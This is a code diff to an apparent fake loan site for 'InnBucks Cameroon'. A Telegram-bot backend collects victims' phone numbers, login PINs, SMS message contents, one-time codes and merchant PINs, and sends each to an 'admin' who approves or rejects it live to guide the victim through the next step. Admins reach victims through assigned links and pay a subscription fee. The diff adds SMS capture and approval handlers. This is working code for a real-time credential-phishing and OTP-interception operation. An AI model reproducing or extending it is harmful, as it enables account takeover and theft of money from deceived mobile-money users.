+        await db.updateApplication(applicationId, { pinStatus: 'approved' });
+        console.log(`✅ PIN APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+✅ *LOGIN APPROVED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 PIN: \`${application.pin}\`
+
+✓ User can now proceed to SMS verification
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Login approved! User can now submit SMS.' });
+    }
+
+    else if (data.startsWith('deny_pin_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+        console.log(`❌ PIN REJECTED for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *LOGIN DENIED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 PIN: \`${application.pin}\`
+
+✓ User will be sent back to login page
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login denied. User returned to login page.' });
+    }
+
+    // ──────────────────────────────────────
+    // SMS APPROVAL HANDLERS
+    // ──────────────────────────────────────
+    else if (data.startsWith('approve_sms_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        console.log(`✅ SMS APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+✅ *SMS MESSAGE APPROVED*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+📝 *Message:*
+\`\`\`
+${application.smsMessage || 'N/A'}
+\`\`\`
+
+✓ User can now proceed to OTP verification
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved! User can now enter OTP.' });
+    }
+
+    else if (data.startsWith('reject_sms_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { otpStatus: 'rejected' });
+        console.log(`❌ SMS REJECTED for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *SMS MESSAGE INVALID*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+📝 *Message:*
+\`\`\`
+${application.smsMessage || 'N/A'}
+\`\`\`
+
+✓ User will be asked to paste the correct message
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
+    }
+
+    // ──────────────────────────────────────
+    // OTP APPROVAL HANDLERS
+    // ──────────────────────────────────────
+    else if (data.startsWith('approve_otp_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        console.log(`✅ OTP APPROVED for ${applicationId}`);
+
+        await bot.editMessageText(`
+🎉 *LOAN APPROVED!*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 OTP: \`${application.otp}\`
+
+✓ Loan has been approved successfully!
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
+    }
+
+    else if (data.startsWith('wrongcode_otp_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+        console.log(`❌ WRONG OTP CODE for ${applicationId}`);
+
+        await bot.editMessageText(`
+❌ *WRONG OTP CODE*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 OTP entered: \`${application.otp}\`
+
+✓ User will be asked to re-enter OTP
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User asked to try again.' });
+    }
 });
 
 console.log('✅ Telegram callback handler registered!');
@@ -1758,7 +1651,7 @@ app.use((req, res, next) => {
 });
 
 // ==========================================
-// API ENDPOINTS
+// API ENDPOINTS (Rest of the endpoints remain the same)
 // ==========================================
 
 // POST /api/verify-pin
@@ -1769,7 +1662,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });
 
-        // Race condition guard
         const lockKey = `pin_${phoneNumber}`;
         if (processingLocks.has(lockKey)) {
             return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
@@ -1780,8 +1672,6 @@ app.post('/api/verify-pin', async (req, res) => {
         let assignedAdmin;
 
         if (assignmentType === 'specific' && requestAdminId) {
-            // ── HARD LOCK: customer came via a specific admin link ──
-            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1789,24 +1679,14 @@ app.post('/api/verify-pin', async (req, res) => {
                 console.error(`❌ Specific admin not found: ${requestAdminId}`);
                 return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
             }
-
-            // Check link lock status
-            if (assignedAdmin.linkLocked) {
-                processingLocks.delete(lockKey);
-                console.log(`🔒 Link locked for admin: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'This link is currently locked. Admin must complete payment to proceed.' });
-            }
             
-            // Check subscription status (skip for super admins)
-            if (!isSuperAdmin(requestAdminId)) {
-                const subscription = await db.getSubscription(requestAdminId);
-                if (!subscription || subscription.subscriptionStatus === 'suspended') {
-                    processingLocks.delete(lockKey);
-                    return res.status(403).json({
-                        success: false,
-                        message: 'This link is currently suspended. The admin needs to pay the subscription fee to reactivate it.'
-                    });
-                }
+            const subscription = await db.getSubscription(requestAdminId);
+            if (!subscription || subscription.subscriptionStatus === 'suspended') {
+                processingLocks.delete(lockKey);
+                return res.status(403).json({
+                    success: false,
+                    message: 'This link is currently suspended. The admin needs to pay the subscription fee to reactivate it.'
+                });
             }
             
             if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
@@ -1818,9 +1698,8 @@ app.post('/api/verify-pin', async (req, res) => {
             console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
 
         } else {
-            // ── AUTO-ASSIGN: no admin link used ──
             const activeAdmins     = await db.getActiveAdmins();
-            const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId) && !a.linkLocked);
+            const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
                 processingLocks.delete(lockKey);
                 return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
@@ -1836,7 +1715,6 @@ app.post('/api/verify-pin', async (req, res) => {
             console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
         }
 
-        // Duplicate check — only within this admin's pending apps
         const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const alreadyPending  = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
         if (alreadyPending) {
@@ -1849,7 +1727,6 @@ app.post('/api/verify-pin', async (req, res) => {
             });
         }
 
-        // Returning user check (scoped to this admin only)
         const thisAdminPastApps = existingApps
             .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
             .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -1873,7 +1750,6 @@ app.post('/api/verify-pin', async (req, res) => {
             historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
         }
 
-        // Ensure admin is in active map
         if (!adminChatIds.has(assignedAdmin.adminId)) {
             if (assignedAdmin.chatId) {
                 adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
@@ -1883,7 +1759,6 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         }
 
-        // Save application
         await db.saveApplication({
             id:             applicationId,
             adminId:        assignedAdmin.adminId,
@@ -1900,11 +1775,11 @@ app.post('/api/verify-pin', async (req, res) => {
 
         console.log(`💾 Application saved: ${applicationId}`);
 
-        // Send to Telegram
         const userLabel = isReturningUser
             ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
             : '🆕 *NEW APPLICATION*';
-        await sendToAdmin(assignedAdmin.adminId, `
+        
+        const msgResult = await sendToAdmin(assignedAdmin.adminId, `
 ${userLabel}
 
 📋 \`${applicationId}\`
@@ -1955,7 +1830,6 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
 
-        // Re-add admin to map if needed
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
@@ -2009,6 +1883,59 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
     }
 });
 
+// POST /api/verify-sms
+app.post('/api/verify-sms', async (req, res) => {
+    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, smsMessage } = req.body;
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) {
+                adminChatIds.set(admin.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });
+        console.log(`✅ SMS message saved for ${applicationId}`);
+
+        await sendToAdmin(application.adminId, `
+📨 *SMS MESSAGE VERIFICATION*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+⏰ ${new Date().toLocaleString()}
+
+📝 *Message:*
+\`\`\`
+${smsMessage}
+\`\`\`
+
+⚠️ *IS THIS MESSAGE CORRECT?*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Invalid Message',   callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        res.json({ success: true, message: 'SMS submitted for verification' });
+    } catch (error) {
+        console.error('❌ Error in /api/verify-sms:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
 // GET /api/check-merchant-pin-status/:applicationId
 app.get('/api/check-merchant-pin-status/:applicationId', async (req, res) => {
     try {
@@ -2058,7 +1985,6 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
 
-        // Re-add admin to map if needed
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
@@ -2068,7 +1994,6 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
             }
         }
 
-        // Save merchant PIN to application
         await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });
         console.log(`✅ Merchant PIN saved for ${applicationId}: ${merchantPin}`);
 
@@ -2076,7 +2001,6 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
             ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
             : '';
 
-        // Send to Telegram — same style as verify-pin and verify-otp
         await sendToAdmin(application.adminId, `
 💳 *MERCHANT ACCOUNT PIN*${returningLabel}
 
@@ -2150,7 +2074,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the InnBucks HTML ──
+// ── Serve the InnBucks Cameroon HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -2176,12 +2100,12 @@ app.get('/', async (req, res) => {
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n💎 INNBUCKS LOAN PLATFORM`);
-    console.log(`==========================`);
+    console.log(`\n💎 INNBUCKS CAMEROON LOAN PLATFORM`);
+    console.log(`==================================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
     console.log(`👥 Admins: ${adminChatIds.size} connected`);
-    console.log(`⭐ Super Admins: ${SUPER_ADMINS.join(', ')}`);
+    console.log(`⭐ Super Admins: ${SUPER_ADMINS.length}`);
     console.log(`\n✅ Ready!\n`);
 });
 
@@ -2191,10 +2115,6 @@ app.listen(PORT, () => {
 async function shutdownGracefully(signal) {
     console.log(`\n🛑 Received ${signal}, shutting down...`);
     try {
-        // Clear all link payment timers
-        for (const [adminId, timer] of adminLinkTimers.entries()) {
-            clearTimeout(timer);
-        }
         await bot.deleteWebHook();
         await db.closeDatabase();
         console.log('✅ Cleanup complete');
